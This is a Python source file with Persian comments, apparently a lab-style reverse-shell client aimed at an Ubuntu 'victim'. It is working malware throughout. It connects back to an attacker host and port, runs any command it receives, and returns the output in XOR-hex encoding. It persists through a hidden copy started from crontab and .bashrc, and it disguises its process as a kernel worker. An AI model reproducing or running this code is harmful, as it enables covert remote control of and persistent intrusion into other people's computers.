# victim_ubuntu.py
import socket
import subprocess
import os
import sys
import time
import platform
import random

# کلید XOR (همانند سرور)
XOR_KEY = 0xAB

def xor_encrypt_decrypt(data, key):
    return bytes([b ^ key for b in data])

def execute_command(cmd):
    """اجرای دستور با مدیریت خطا"""
    try:
        # حذف فضای خالی اضافه
        cmd = cmd.strip()
        
        # دستورات ویژه
        if cmd.startswith("cd "):
            path = cmd[3:].strip()
            os.chdir(path)
            return f"Changed directory to {os.getcwd()}\n".encode()
        
        # اجرای دستور عادی
        result = subprocess.run(
            cmd, 
            shell=True,
            executable='/bin/bash',
            capture_output=True,
            text=False,
            timeout=15
        )
        
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr if result.stderr else b"Command failed\n"
            
    except subprocess.TimeoutExpired:
        return b"Command timeout (15 seconds)\n"
    except FileNotFoundError:
        return b"Command not found\n"
    except PermissionError:
        return b"Permission denied\n"
    except Exception as e:
        return f"Error: {str(e)}\n".encode()

def add_persistence():
    """ایجاد persistence روی Ubuntu"""
    try:
        # کپی فایل به مسیر مخفی
        import shutil
        import getpass
        
        username = getpass.getuser()
        hidden_path = f"/home/{username}/.config/.systemd"
        
        os.makedirs(hidden_path, exist_ok=True)
        shutil.copy(__file__, f"{hidden_path}/.sysupdate.py")
        
        # اضافه کردن به crontab
        cron_cmd = f"@reboot python3 {hidden_path}/.sysupdate.py\n"
        with open(f"/tmp/crontab_{random.randint(1000,9999)}", "w") as f:
            f.write(cron_cmd)
        
        os.system(f"crontab /tmp/crontab_* 2>/dev/null")
        
        # اضافه کردن به .bashrc
        bashrc_line = f"\nnohup python3 {hidden_path}/.sysupdate.py > /dev/null 2>&1 &\n"
        with open(f"/home/{username}/.bashrc", "a") as f:
            f.write(bashrc_line)
        
        return "[+] Persistence added successfully\n".encode()
    except Exception as e:
        return f"[-] Persistence failed: {str(e)}\n".encode()

def connect_to_attacker():
    """اتصال به سرور مهاجم"""
    ATTACKER_IP = "192.168.253.129"  # آدرس IP کالی
    ATTACKER_PORT = 9999
    
    print(f"[*] Target: {ATTACKER_IP}:{ATTACKER_PORT}")
    
    while True:
        try:
            # ایجاد اتصال
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10)
            client.connect((ATTACKER_IP, ATTACKER_PORT))
            
            # ارسال اطلاعات سیستم
            sys_info = f"""
[+] Ubuntu Connected!
[+] User: {os.getenv('USER', 'unknown')}
[+] Hostname: {platform.node()}
[+] OS: {platform.system()} {platform.release()}
[+] Directory: {os.getcwd()}
[+] Time: {time.ctime()}

Ready for commands...
            """.encode()
            
            encrypted_info = xor_encrypt_decrypt(sys_info, XOR_KEY)
            client.sendall(encrypted_info.hex().encode() + b'\n')
            
            print(f"[+] Connected to attacker at {ATTACKER_IP}")
            
            # حلقه اصلی دریافت دستورات
            while True:
                try:
                    # دریافت داده
                    data = b""
                    while True:
                        char = client.recv(1)
                        if char == b'\n' or not char:
                            break
                        data += char
                    
                    if not data:
                        print("[-] No data received")
                        break
                    
                    # رمزگشایی دستور
                    hex_str = data.decode().strip()
                    if not hex_str:
                        continue
                        
                    encrypted_cmd = bytes.fromhex(hex_str)
                    command = xor_encrypt_decrypt(encrypted_cmd, XOR_KEY).decode()
                    
                    print(f"[+] Received command: {command}")
                    
                    # پردازش دستورات ویژه
                    if command.lower() == "exit":
                        client.close()
                        return
                    
                    elif command.lower() == "persist":
                        output = add_persistence()
                    
                    elif command.lower() == "system":
                        info = f"""
=== System Information ===
User: {os.getenv('USER')}
Hostname: {platform.node()}
Kernel: {platform.release()}
Architecture: {platform.machine()}
Python: {platform.python_version()}
Uptime: {os.popen('uptime -p').read().strip()}
                        """.encode()
                        output = info
                    
                    else:
                        # اجرای دستور عادی
                        output = execute_command(command)
                    
                    # ارسال پاسخ
                    encrypted_output = xor_encrypt_decrypt(output, XOR_KEY)
                    hex_output = encrypted_output.hex()
                    client.sendall(hex_output.encode() + b'\n')
                    
                except socket.timeout:
                    # ارسال keep-alive
                    try:
                        client.sendall(xor_encrypt_decrypt(b"ALIVE", XOR_KEY).hex().encode() + b'\n')
                    except:
                        break
                    continue
                    
                except Exception as e:
                    error_msg = f"[-] Command error: {str(e)}\n".encode()
                    try:
                        client.sendall(xor_encrypt_decrypt(error_msg, XOR_KEY).hex().encode() + b'\n')
                    except:
                        break
                    continue
            
            client.close()
            print("[-] Connection lost, reconnecting...")
            
        except ConnectionRefusedError:
            print(f"[-] Connection refused. Retrying in 30 seconds...")
            time.sleep(30)
            
        except socket.timeout:
            print(f"[-] Connection timeout. Retrying in 30 seconds...")
            time.sleep(30)
            
        except KeyboardInterrupt:
            print("\n[!] Client stopped by user")
            sys.exit(0)
            
        except Exception as e:
            print(f"[-] Connection error: {e}")
            print("[*] Reconnecting in 30 seconds...")
            time.sleep(30)

def main():
    """تابع اصلی"""
    print("[*] Ubuntu Reverse Shell Client")
    print("[*] Connecting to Kali Linux at 192.168.253.129:9999")
    
    # مخفی‌سازی فرآیند
    try:
        # تغییر نام فرآیند
        import ctypes
        libc = ctypes.CDLL(None)
        libc.prctl(15, b'[kworker/u:0]', 0, 0, 0)
    except:
        pass
    
    # اتصال
    connect_to_attacker()

if __name__ == "__main__":
    # اجرای مخفی در پس‌زمینه
    if len(sys.argv) > 1 and sys.argv[1] == "--daemon":
        import daemon
        with daemon.DaemonContext():
            main()
    else:
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError:
            pass
        
        # تغییر دایرکتوری
        os.chdir("/")
        os.setsid()
        os.umask(0)
        
        main()


        